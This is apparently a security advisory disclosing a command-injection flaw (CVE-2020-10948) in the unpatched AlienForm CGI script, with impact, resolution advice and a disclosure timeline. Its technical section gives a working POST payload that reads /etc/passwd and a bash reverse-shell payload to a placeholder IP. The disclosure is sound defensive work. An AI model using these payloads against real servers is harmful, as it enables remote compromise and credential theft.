# FEYE-2020-0004

## Description
AlienForm v2.0.2 CGI script is vulnerable to remote code execution leading to server compromise by attackers. This vulnerability could be a derivative or unexplored area of CVE-2002-0934.

## Impact
High - Successful exploitation of this vulnerability results in the attacker remotely executing code on the affected systems. Remote code execution could lead to complete system compromise and the ability to gain access to user credentials and/or move laterally throughout the compromised environment.

## Exploitability
High - An attacker needs only to identify the affected CGI script is present on the server; a simple directory brute force can reveal the presence of the vulnerable CGI file.

## CVE Reference
CVE-2020-10948

## Technical Details
Mandiant discovered the affected server is vulnerable to command injection in CGI argument parameters

Affected URL:
http://<affected host>//cgibin/af2.cgi

Example attack payload:

POST //cgibin/af2.cgi HTTP/1.1
Host: <affected host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 38

_browser_out=%7Ccat%20/etc/passwd%7C

Reverse Shell Example:

_browser_out=%7Cbash+-i+>%26+/dev/tcp/<IP>/8080+0>%261%7C

## Resolution
Defunct software no longer support by vendor; not fixed.  FireEye Mandiant recommends disabling the affected CGI Script and to avoid using legacy CGI scripts in environments which do not have security support.

## Discovery Credits
Nikhith Tummalapalli, Mandiant FireEye

## Disclosure Timeline

- 19 Dec 2019: Emailed jon@cgi.tj to report (http://1-4a.com/cgi-bin/alienform/af.cgi)...email bounced back
- 19 Dec 2019: Searched for other contacts for Jon Hedley...no avail
- 24 Mar 2020: Reserved CVE with Mitre after 90 days

## References 

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0934